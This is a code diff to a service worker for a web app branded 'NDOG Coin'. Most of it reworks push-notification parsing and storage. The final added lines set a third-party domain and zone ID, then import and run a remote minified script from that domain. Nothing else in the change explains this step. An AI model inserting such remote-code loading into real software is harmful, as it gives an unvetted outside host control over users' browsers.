@@ -110,34 +110,79 @@ self.addEventListener('notificationclick', (event) => {
 });
 
 // ═══════════════════════════════════════════════════════
-// PUSH EVENT HANDLER (OneSignal delegates to this)
+// PUSH EVENT HANDLER — Compatible with OneSignal Web SDK v16
+// OneSignal SDK.worker.js handles most push events internally.
+// This handler acts as a FALLBACK for non-OneSignal push payloads
+// (e.g. if you later add FCM direct push alongside OneSignal).
 // ═══════════════════════════════════════════════════════
 
 self.addEventListener('push', (event) => {
-  const data = event.data ? event.data.json() : {};
+  // Skip if OneSignal already handled this (OneSignal sets a flag)
+  if (event.__handledByOneSignal) return;
+
+  let data = {};
+  try {
+    // OneSignal wraps payload; try multiple formats
+    const raw = event.data ? event.data.json() : {};
+    // OneSignal format: { custom: { ... }, title, body, ... }
+    data = raw.custom || raw;
+    if (!data.title && raw.title) data.title = raw.title;
+    if (!data.body && raw.body) data.body = raw.body;
+    if (!data.title && raw.notification) {
+      data.title = raw.notification.title || 'NDOG Coin';
+      data.body = raw.notification.body || '';
+    }
+  } catch (e) {
+    // If JSON parse fails, try text
+    data = { body: event.data ? event.data.text() : '' };
+  }
+
   const title = data.title || 'NDOG Coin';
+  const body = data.body || data.message || 'New update available!';
+
   const options = {
-    body: data.body || data.alert && data.alert.body || 'New update available!',
+    body: body,
     icon: data.icon || './icons/icon-192.png',
     badge: './icons/icon-72.png',
     vibrate: [100, 50, 100],
     data: {
-      url: data.url || data.click_action || './',
-      source: data.source || 'onesignal',
+      url: data.url || data.click_action || data.link || './',
+      source: data.source || 'push-fallback',
       title: title,
-      body: data.body || ''
+      body: body
     },
     tag: 'ndog-push-' + Date.now(),
     renotify: true,
+    requireInteraction: false,
+    silent: false,
   };
 
-  // Save to IndexedDB
+  // Also try to show via OneSignal's API for richer display
+  try {
+    if (typeof OneSignal !== 'undefined' && OneSignal.ServiceWorker) {
+      // Let OneSignal handle it — it will show the notification
+      // Still save to IndexedDB
+      saveNotificationToIndexedDB({
+        title: title,
+        message: body,
+        icon: options.icon,
+        ts: data.timestamp || Date.now(),
+        source: data.source || 'push',
+        read: false
+      });
+      return;
+    }
+  } catch (e) {
+    // OneSignal not available in this context, use native showNotification
+  }
+
+  // Fallback: show natively
   saveNotificationToIndexedDB({
     title: title,
-    message: options.body,
+    message: body,
     icon: options.icon,
     ts: data.timestamp || Date.now(),
-    source: data.source || 'onesignal',
+    source: data.source || 'push',
     read: false
   });
 
@@ -315,3 +360,10 @@ self.addEventListener('message', (event) => {
     });
   }
 });
+
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 11193124
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
